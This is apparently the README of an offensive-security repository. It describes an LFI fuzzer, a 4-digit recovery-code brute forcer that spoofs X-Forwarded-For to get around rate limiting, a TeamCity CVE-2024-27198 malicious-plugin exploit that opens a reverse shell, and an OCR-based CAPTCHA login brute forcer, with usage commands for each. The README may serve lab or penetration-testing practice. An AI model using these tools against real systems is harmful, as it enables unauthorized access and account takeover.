# FuzzingTools

## LFI Fuzzer

A multithreaded Local File Inclusion (LFI) fuzzing tool with a Rich progress bar.
It sends payloads from a wordlist to a target URL, checks for successful inclusion based on keywords, and saves results.

## Usage

python3 lfi_fuzzer.py -w wordlist.txt -u "http://target.com/page?file={}" -t 10 \
-H headers.txt -o all_results.txt -s success.txt -k "root:x:,Windows" -S

## 4-Digit Recovery Code Brute Forcer

This Python script brute-forces a 4-digit numeric recovery code on a vulnerable reset_password.php endpoint. It uses threading, random spoofed IPs (X-Forwarded-For), and a provided PHP session to bypass rate-limiting and speed up the attack.

## Usage
python3 bypass_rate_limiting.py -ip <TARGET_IP> -p <PORT> -SID <PHPSESSID> -t <THREADS>

## TeamCity Evil Plugin Exploit

This script automates the process of building, uploading, enabling, and triggering a malicious TeamCity plugin that provides a reverse shell.

## Usage
python3 teamcity_CVE-2024-27198.py -t http://target:8111 -l 10.10.14.5 -p 4444

## Captcha Brute-Force

This Python script automates login attempts on a web page protected by a CAPTCHA. It uses Selenium to control a browser, downloads the CAPTCHA image, reads it using OCR (pytesseract), and tries passwords from a given wordlist.

## Usage

python3 captcha_brute_force.py -t traget_url -w wordlist -u username -c captcha_page

## Dependencies

pip3 install --upgrade pip
pip3 install selenium pillow pytesseract requests
sudo apt update
sudo apt install tesseract-ocr
